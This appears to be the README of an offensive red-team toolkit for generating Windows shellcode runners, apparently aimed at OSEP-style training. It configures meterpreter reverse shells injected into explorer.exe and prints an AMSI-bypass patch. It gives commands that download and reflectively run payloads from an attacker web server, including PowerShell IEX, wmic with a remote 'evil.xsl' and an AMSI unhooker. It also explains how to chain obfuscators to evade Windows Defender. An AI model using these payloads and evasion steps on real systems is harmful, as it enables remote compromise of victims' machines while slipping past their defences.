# Description

## Usage

### Folders
| Name | Description |
| --- | --- |
| Templates | Containing Shellcode Runners with and without encryption in various formats. |
| payloads | Containing Shellcode Runners that can executed. |
| ConfuserEx | Compiled files of ConfuserEx GitHub project. |
| Net-Obfuscate | Compiled files of Net-Obfuscate GitHub project.|


### Static Variables 
| Variables | Description |
| --- | --- |
| PROCESS_TO_INJECT | Contains the process name that you want to inject into|
| MSFVENOM_PAYLOAD | MSF Payload |
| LHOST | Listener IP |
| LPORT | Listener Port | 

```
#!/bin/bash
...
PROCESS_TO_INJECT="explorer.exe"
MSFVENOM_PAYLOAD="windows/x64/meterpreter/reverse_tcp"
LHOST="192.168.100.128"
LPORT=443
...
```

### Payload prefixes
| Name | Description |
| --- | --- |
| _embedded | If the generated payload contains the word **embedded** then the **shellcode** is located inside the generated executable. |
| _marshal | If the generated payload contains the word **marshal** then payload will be injected to executable's memory space. |
| _numa | If the generated payload contains the word **numa** then **VirtualAllocExNuma** was used insetad of **VirtualAllocEx** |
| _FlsAlloc | If the generated payload contains the word **FlsAlloc** then **FlsAlloc** API was used. |

#### Payload Example
When payload is generated with name ```shellcode_runner_assembly_FlsAlloc_marshal.exe```, it means:
- FlsAlloc API was used
- The Shellcode will be injected to executable's address space (Not to a remote process).

---
## Payload execution

### [+] Triple DES

The 3DES payloads are located under ```payloads/3DES/``` directory. There are two payloads and need to be executed diferrently. 

#### Method 1
The executable **des_decryptor.exe** is downloading the file from your Web server and executes it reflectively.

```
cmd> des_decryptor.exe http://KALI_IP/<SHELLCODE_RUNNER>
```

#### Method 2
The executable embedds a shellcode runner. You can run it without providing any commands. 

```
cmd> des_decryptor_embedded.exe
```

----

### [+] AMSI Bypass
There are two methods to bypass AMSI:
- Patching 
- Unhooking

#### Method 1
Patching template is what Offensive-Security teaches in OSEP with some small changes. The execution of 1st method (Patching) is straight forward and uses well-known methodologies.

```
$m="System.Management.Automation.Ams";[Ref].Assembly.GetType("$m"+"iUtils").GetField('amsiInitFai'+'led','NonPublic,Static').SetValue($null,$true)
```

```
# XOR RAX,RAX 
$buf = [Byte[]] (0x48,0x31,0xC0)  
```

**Execute AMSI Shellcode runner**
``` 
powershell -nop -exec bypass -c IEX((New-Object Net.WebClient).DownloadString('http://<IP>/shellcode_runner.html')); 
``` 

#### Method 2
To unhook AMSI, I've used the project by **jfmaes - AmsiHooker** (https://github.com/jfmaes/AmsiHooker) and I permfored some small changes. When AmsiHooker executable will launched, it will download the Shellcode Runner from your web server and it will reflectively execute it.

**Steps**
1. Upload ```unhook_amsi.exe``` and ```MinHook.NET.dll``` to victim. (Files located under ```payloads/AMSI/```)
2. ```unhook_amsi.exe http://<KALI>/shellcode_runner.exe```

---

### [+] Executing .XSL, .JS, .HTA

Under directory ```payloads/DotNetToJScript/```, you find three shellcode ruuners that generated with **DotNetToJScript** (https://github.com/tyranid/DotNetToJScript). 

**Executing .XSL shellcode runner**
```
wmic process list /FORMAT:evil.xsl
wmic os get /FORMAT:"https://example.com/evil.xsl"
```

**Executing .HTA shellcode runner**
```
mshta c:\users\public\shellcode_runner.hta
```

**Executing .JS shellcode runner**
```
wscript c:\users\public\shellcode_runner.js
```

More execution methods can be found:
- https://lolbas-project.github.io/


### [+] ConfuserX + Net-Obfuscator

During my tests, I noticed that Windows Defender could detect payloads genereted by **ConfuserEx** (https://github.com/yck1509/ConfuserEx). For this reason, I combined ```ConfuserEx + Net-Obfuscator``` (https://github.com/BinaryScary/NET-Obfuscate). 

First, payloads that are located under ```payloads/XOR/``` and ```payloads/Caesar/``` directories, feed the **ConfuserEx** tool and subsequently the new obfuscated binaries are imported to **Net-Obfuscator**. As a result, the GetType and GetMethod values are obfuscated and  dynamically created.

**Example 1** - Execution of ```payloads/Caesar/shellcode_runner_assembly_numa.exe``` Reflectively.
```
[+] Creating DLL/EXE file (ConfuserEx + .NET Obfuscator) ...

 [!] Obfuscating CAESAR -> shellcode_runner_assembly_numa.exe
 [*] PS>$data=(New-Object System.Net.WebClient).DownloadData('http://192.168.119.120/shellcode_runner.exe|dll')
 [*] PS>$ass=[System.Reflection.Assembly]::Load($data)
 [*] PS>$ass.GetType("J46IIOTXPW.PZAZUJAD4V").GetMethod("NK6WAROB2W").Invoke($null,$null)
```
